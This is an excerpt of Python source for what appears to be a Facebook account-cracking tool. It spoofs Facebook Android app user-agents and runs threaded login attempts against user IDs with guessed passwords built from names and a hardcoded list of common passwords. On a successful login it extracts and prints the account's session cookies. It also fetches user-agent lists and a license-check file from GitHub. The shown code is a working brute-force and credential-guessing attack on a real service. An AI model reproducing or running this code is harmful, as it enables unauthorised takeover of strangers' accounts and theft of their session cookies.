...
STC_PAWAR = requests.get ("https://raw.githubusercontent.com/Mosarofsiamkhan/Ua1.txt/main/Ua_text").text.splitlines()

TARA_505 = random.choice(STC_PAWAR)
...
from concurrent.futures import ThreadPoolExecutor as SiamSIAM
from string import * 
...
def menu():   
  ...
  ###  elif select =='2':
       ...
       os.system('xdg-open https://t.me/+8801923690354');menu()
    else:
        print('\n Select Wrong option ... ')
        time.sleep(2)
        SIAM(allkey)
...
def uaxxx():
    ua='[FBAN/FB4A;FBAV/236.0.0.9.390;FBBV/630088919;FBDM/{density=2.0,width=1440,height=1280};FBLC/it_IT;FBRV/115809141;FBCR/OPPO;FBMF/OPPO;FBBD/OPPO A53m;FBPN/com.facebook.katana;FBDV/CPH2237;FBSV/16;FBOP/4;FBCA/arm64-v8a;]'
    return ua
def method_crack():
    global methods
    clear()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            ...
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/293.0.0.29.381;FBBV/355287298;FBDM/{density=3.0,width=1080,height=1280};FBLC/ja_JP;FBRV/489747236;FBCR/OPPO;FBMF/OPPO;FBBD/OPPO Reno;FBPN/com.facebook.katana;FBDV/CPH2293;FBSV/11;FBOP/4;FBCA/arm64-v8a;] FBBK/1'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SIAMb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SIAMb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mSIAM-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mJAD-XD-M2\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
            ...
            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
            #######m3####
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/175.0.0.19.421;FBBV/379071027;FBDM/{density=2.0,width=1920,height=1280};FBLC/fr_FR;FBRV/903077217;FBCR/OPPO;FBMF/OPPO;FBBD/OPPO A33m;FBPN/com.facebook.katana;FBDV/CPH2357;FBSV/16;FBOP/4;FBCA/armeabi;] FBBK/1'
            ######
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'Content-Length': str(len(content_lenght))}
    ...
    def methodB(self, sid, name, psw):
        try:
            ...
            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
            ####m2######
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/444.0.0.39.374;FBBV/464094052;FBDM/{density=2.0,width=2560,height=1920};FBLC/de_DE;FBRV/210364375;FBCR/OPPO;FBMF/OPPO;FBBD/OPPO R9sk;FBPN/com.facebook.katana;FBDV/CPH2059;FBSV/11;FBOP/4;FBCA/armeabi-v7a;]'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
...
'Content-Length': str(len(content_lenght))}
    ...
    def methodD(self, sid, name, psw):
        try:
            ...
            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
            #####m4#####
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/486.0.0.26.220;FBBV/369334997;FBDM/{density=1.5,width=1440,height=2560};FBLC/zh_CN;FBRV/859235670;FBCR/OPPO;FBMF/OPPO;FBBD/OPPO R9tm;FBPN/com.facebook.katana;FBDV/CPH2036;FBSV/16;FBOP/5;FBCA/arm64-v8a;]'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
...
'Content-Length': str(len(content_lenght))}
    ...
    def pasw(self):       
            ...
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with SiamSIAM(max_workers=30) as SIAMworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SIAMworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SIAMworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SIAMworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SIAMworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def BD():
    ...
    with ThreadPool(max_workers=70) as Aryan:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'free fire','Free Fire','freefire','freefire1122','freefire1234','freefire@#','anwar@#','123456','12345678','sabbirgaming','rahadgaming','freefire','iloveyou','123456@#৳','1234৳#@','hosen','hossain','gaming','mimgaming','jahidkhan','khan','jihadgaming','jaragaming','jihadboss','password','654321৳#@','@#৳%&*','1234567890','123456789','tuyagaming','bangladesh','tanvirhassan','tanvir','tanvirgaming','abirhassan','sakib','sakidgaming','sathi','rakib','rakibgaming']
...
def rcrack(uid,pwx,tl):
    ...
    'dpr': '1.875',
    'referer': 'https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fbookmarks%2F&refsrc=deprecated&wtsid=rdr_0WXC2pdfwqdhZAHfN&_rdr',
...
def main_apv():
    ...
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/Mdtaeik417/Ttt/blob/main/Ttt.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
